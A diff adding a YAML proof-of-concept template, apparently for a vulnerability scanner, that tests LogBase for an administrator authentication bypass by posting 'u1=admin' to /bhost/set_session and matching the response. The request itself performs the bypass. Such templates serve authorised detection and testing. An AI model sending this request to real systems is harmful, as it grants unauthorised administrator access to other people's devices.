@@ -1,0 +1,20 @@
+id: poc-yaml-logbase-auth-bypass
+info:
+  name: LogBase 管理员认证绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: LogBase
+  osprey-id: vb_2019_0039
+requests:
+- method: POST
+  path: /bhost/set_session
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Referer: '{{.base_url}}'
+  data: u1=admin
+  expression: 'contains(content_type, "json") && contains(body, "result")
+
+    && contains(body, "ErrMsg") && contains(body, "info")'
+variables: {}
+transport: http
